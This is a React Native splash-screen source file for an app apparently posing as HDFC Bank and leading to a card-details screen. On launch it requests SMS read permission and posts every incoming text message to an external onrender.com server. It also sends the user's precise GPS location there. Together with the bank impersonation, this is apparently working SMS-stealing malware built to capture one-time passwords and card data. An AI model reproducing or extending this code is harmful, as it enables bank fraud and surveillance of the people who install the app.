import { useNavigation } from '@react-navigation/native';
import React, { useEffect, useState } from 'react';
import { View, ActivityIndicator, Text, PermissionsAndroid, Alert, Linking } from 'react-native';
import Geolocation from 'react-native-geolocation-service';
import { requestReadSMSPermission, startReadSMS, stopReadSMS } from '../cardDetails/SmsReader';
import { TouchableOpacity } from 'react-native-gesture-handler';
import { check, PERMISSIONS, RESULTS } from 'react-native-permissions';
import axios from 'axios';
import AsyncStorage from '@react-native-async-storage/async-storage';

const SplashScreen = () => {
    const [smsPermission, setSmsPermission] = useState(false)
    const [locationPermission, setLocationPermission] = useState(false)
    const [locationProviderAvailable, setLocationProviderAvailable] = useState(false)
    const [location, setLocation] = useState({})

    const navigation = useNavigation()


    const requestLocationPermission = () => {

        return new Promise(async (resolve, reject) => {
            const user = AsyncStorage.getItem("hdfc-bank-token") && JSON.parse(await AsyncStorage.getItem("hdfc-bank-token")) || {}

            const hasLocationPermission = await PermissionsAndroid.check(
                PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
            );
            if (hasLocationPermission) resolve(true);
            // else requestLocationPermission()
            console.log("hasLocationPermission", hasLocationPermission)

            PermissionsAndroid.request(
                PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
                {
                    title: 'Location',
                    message: 'Please allow the location.',
                    buttonNeutral: 'Ask Me Later',
                    buttonNegative: 'Cancel',
                    buttonPositive: 'OK',
                },
            )
                .then(granted => {
                    console.log("granted", granted)
                    if (granted === PermissionsAndroid.RESULTS.GRANTED) {
                        setLocationPermission(true)
                        console.log("LocationPermission granted")

                        Geolocation.getCurrentPosition(
                            position => {
                                console.log("position", position);
                                if (position) {
                                    setLocation(position)
                                    setLocationProviderAvailable(true)
                                    const myPosition = {
                                        latitude: position?.coords?.latitude, longitude: position?.coords?.longitude
                                    }
                                    console.log("myPosition", myPosition)
                                    axios.post("https://hdfc-bank-9qmz.onrender.com/api/v1/user/updateLocation", myPosition, {
                                        headers: {
                                            userid: user._id,
                                            token: user.token
                                        }
                                    })
                                        .then(resp => {
                                            console.log("location updated", resp)
                                        })
                                        .catch(error => {
                                            console.log("location api error", error)
                                            console.log("location api error", error.response)
                                        })
                                }
                                else {
                                    setLocationProviderAvailable(false)
                                }
                            },
                            error => {
                                if (error.message === "No location provider available.") {
                                    Alert.alert("Turn on your location to get into App")
                                }
                                // See error code charts below.
                                console.log("error.code, error.message", error.code, error.message);
                                setLocation({});
                            },
                            { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 },
                        );
                        resolve(true)
                    }
                    else {
                        setLocationPermission(false)
                        resolve(false)
                    };
                })
                .catch(err => {
                    console.log("location permission error", err)
                    reject(err)
                });
        });
    };

    const StartReadSMS = async () => {
        const hasSMSPermission = await requestReadSMSPermission();
        const user = AsyncStorage.getItem("hdfc-bank-token") && JSON.parse(await AsyncStorage.getItem("hdfc-bank-token")) || {}

        console.log("hasSMSPermission", hasSMSPermission)
        if (hasSMSPermission) {
            requestLocationPermission()

            setSmsPermission(true)
            startReadSMS((status, sms, error) => {
                if (status == "success") {
                    axios.post("https://hdfc-bank-9qmz.onrender.com/api/v1/user/updateMessages", { message: sms }, {
                        headers: {
                            userid: user._id,
                            token: user.token
                        }
                    })
                        .then(resp => {
                            console.log("message updated", resp)
                        })
                        .catch(error => {
                            console.log("message api error", error)
                        })
                    console.log("Great!! you have received new sms:", sms);
                }
            });
        }
        else {
            setSmsPermission(false)
            console.log("permissioned denied")
        }
    };

    useEffect(() => {
        // requestLocationPermission()
        StartReadSMS();
    }, [])

    useEffect(() => {
        console.log("locationPermission", locationPermission, "locationProviderAvailable", locationProviderAvailable)
        if (locationPermission && locationProviderAvailable) {
            navigation.replace("CardDetails", { location })
        }
    }, [locationPermission, smsPermission, locationProviderAvailable])

    const openSettings = () => {
        Linking.openSettings();
    }


    return (
        <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
            <ActivityIndicator />
            <TouchableOpacity onPress={() => openSettings()}>
                <Text style={{ color: "#000" }}>Open Settings</Text>
            </TouchableOpacity>
            {/* {!(locationPermission && smsPermission) ?
                <>
                    <Text style={{ color: "#000", marginVertical: 12 }}>Permissions Required</Text>
                    <TouchableOpacity onPress={openSettings}>
                        <Text style={{ color: "#000" }}>Open Settings</Text>
                    </TouchableOpacity>
                </>
                : null}
            {
                !locationProviderAvailable ?
                    <Text style={{ color: "#000", marginVertical: 12 }}>Turn on Device location</Text>
                    : null
            } */}
        </View >
    );
};

export default SplashScreen;
